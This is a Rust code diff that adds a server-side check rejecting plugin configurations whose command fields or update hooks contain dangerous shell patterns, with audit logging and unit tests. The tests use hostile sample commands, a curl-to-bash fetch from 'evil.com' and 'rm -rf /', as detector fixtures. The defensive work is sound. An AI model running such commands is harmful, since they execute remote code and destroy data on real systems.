@@ -109,6 +109,24 @@ pub async fn create_plugin_config(
         return error_response(StatusCode::BAD_REQUEST, e.to_string());
     }
 
+    // Reject dangerous command patterns when operator policy is enabled.
+    if state.reject_dangerous_commands {
+        let dangerous = collect_dangerous_patterns(&req.config);
+        if !dangerous.is_empty() {
+            tracing::warn!(
+                user_id = %user.user_id,
+                tenant_id = %tenant_db.tenant_id,
+                plugin_type = %plugin_type_str,
+                config_name = %config_name,
+                "security_audit: plugin config creation rejected — dangerous command patterns detected"
+            );
+            return error_response(
+                StatusCode::BAD_REQUEST,
+                format_dangerous_pattern_rejection(&dangerous),
+            );
+        }
+    }
+
     match pc_queries::create_plugin_config(state.plugin_ops.as_ref(), &tenant_db, req).await {
         Ok(resp) => {
             if command_fields.is_empty() {
@@ -245,6 +263,25 @@ pub async fn update_plugin_config(
         .unwrap_or_default();
     // Clone for audit logging (req is consumed by update_plugin_config).
     let config_for_audit = req.config.clone();
+
+    // Reject dangerous command patterns when operator policy is enabled.
+    if state.reject_dangerous_commands
+        && let Some(ref config) = req.config
+    {
+        let dangerous = collect_dangerous_patterns(config);
+        if !dangerous.is_empty() {
+            tracing::warn!(
+                user_id = %user.user_id,
+                tenant_id = %tenant_db.tenant_id,
+                plugin_config_id = %config_id,
+                "security_audit: plugin config update rejected — dangerous command patterns detected"
+            );
+            return error_response(
+                StatusCode::BAD_REQUEST,
+                format_dangerous_pattern_rejection(&dangerous),
+            );
+        }
+    }
 
     match pc_queries::update_plugin_config(state.plugin_ops.as_ref(), &tenant_db, config_id, req)
         .await
@@ -525,6 +562,78 @@ pub async fn discard_plugin_config_discovered(
 }
 
 // ── Security audit helpers ────────────────────────────────────────────────────
+
+/// Detected dangerous pattern in a command-bearing field.
+struct DangerousPatternMatch {
+    /// Display-friendly field name (e.g. `"version_command"`, `"hooks.pre_update.commands[0]"`).
+    field: String,
+    /// Short description of the detected pattern.
+    description: &'static str,
+}
+
+/// Scan all command-bearing fields in a plugin config for dangerous patterns.
+///
+/// Returns a list of matches. An empty list means no dangerous patterns were found.
+fn collect_dangerous_patterns(config: &serde_json::Value) -> Vec<DangerousPatternMatch> {
+    let obj = match config.as_object() {
+        Some(o) => o,
+        None => return Vec::new(),
+    };
+
+    let mut results = Vec::new();
+
+    // Check top-level command string fields.
+    for &(field_name, display_name, _) in AUDIT_COMMAND_FIELDS {
+        if let Some(val) = obj.get(field_name).and_then(|v| v.as_str()) {
+            let patterns =
+                uptrakit_web_api_types::command_validation::detect_dangerous_patterns(val);
+            for (_, desc) in patterns {
+                results.push(DangerousPatternMatch {
+                    field: display_name.to_string(),
+                    description: desc,
+                });
+            }
+        }
+    }
+
+    // Check structured hook commands.
+    if let Some(hooks) = obj.get("hooks").and_then(|v| v.as_object()) {
+        for phase in ["pre_update", "post_update"] {
+            if let Some(hook) = hooks.get(phase).and_then(|v| v.as_object())
+                && let Some(arr) = hook.get("commands").and_then(|v| v.as_array())
+            {
+                for (i, cmd) in arr.iter().enumerate() {
+                    if let Some(cmd_str) = cmd.as_str() {
+                        let patterns =
+                            uptrakit_web_api_types::command_validation::detect_dangerous_patterns(
+                                cmd_str,
+                            );
+                        for (_, desc) in patterns {
+                            results.push(DangerousPatternMatch {
+                                field: format!("hooks.{phase}.commands[{i}]"),
+                                description: desc,
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    results
+}
+
+/// Format a rejection error message from a list of dangerous pattern matches.
+fn format_dangerous_pattern_rejection(matches: &[DangerousPatternMatch]) -> String {
+    use std::fmt::Write;
+    let mut msg = String::from(
+        "Plugin config contains dangerous command patterns and was rejected by server policy",
+    );
+    for m in matches {
+        write!(msg, "; {}: {}", m.field, m.description).expect("write to String never fails");
+    }
+    msg
+}
 
 /// Emit `security_audit:` warnings for any dangerous patterns found in
 /// command-bearing fields of a plugin configuration.
@@ -992,5 +1101,65 @@ mod tests {
         });
         let fields = detect_command_fields(&config);
         assert!(fields.is_empty(), "empty commands array should be excluded");
+    }
+
+    // ── collect_dangerous_patterns tests ──────────────────────────────
+
+    use super::collect_dangerous_patterns;
+    use super::format_dangerous_pattern_rejection;
+
+    #[test]
+    fn collect_dangerous_curl_pipe_bash() {
+        let config = serde_json::json!({
+            "version_command": "curl https://evil.com/payload | bash"
+        });
+        let matches = collect_dangerous_patterns(&config);
+        assert!(!matches.is_empty());
+        assert!(matches[0].field == "version_command");
+        assert!(matches[0].description.contains("remote script"));
+    }
+
+    #[test]
+    fn collect_dangerous_hook_commands() {
+        let config = serde_json::json!({
+            "hooks": {
+                "pre_update": {
+                    "commands": ["rm -rf /"]
+                }
+            }
+        });
+        let matches = collect_dangerous_patterns(&config);
+        assert!(!matches.is_empty());
+        assert_eq!(matches[0].field, "hooks.pre_update.commands[0]");
+        assert!(matches[0].description.contains("recursive delete"));
+    }
+
+    #[test]
+    fn collect_no_dangerous_patterns_benign() {
+        let config = serde_json::json!({
+            "version_command": "dpkg -l | grep nginx",
+            "update_command": "apt-get install -y nginx"
+        });
+        let matches = collect_dangerous_patterns(&config);
+        assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn collect_non_object_returns_empty() {
+        let config = serde_json::json!("not an object");
+        let matches = collect_dangerous_patterns(&config);
+        assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn format_rejection_message() {
+        let matches = vec![super::DangerousPatternMatch {
+            field: "version_command".to_string(),
+            description: "pipe remote script to shell",
+        }];
+        let msg = format_dangerous_pattern_rejection(&matches);
+        assert!(msg.contains("dangerous command patterns"));
+        assert!(msg.contains("version_command"));
+        assert!(msg.contains("pipe remote script to shell"));
     }
 }
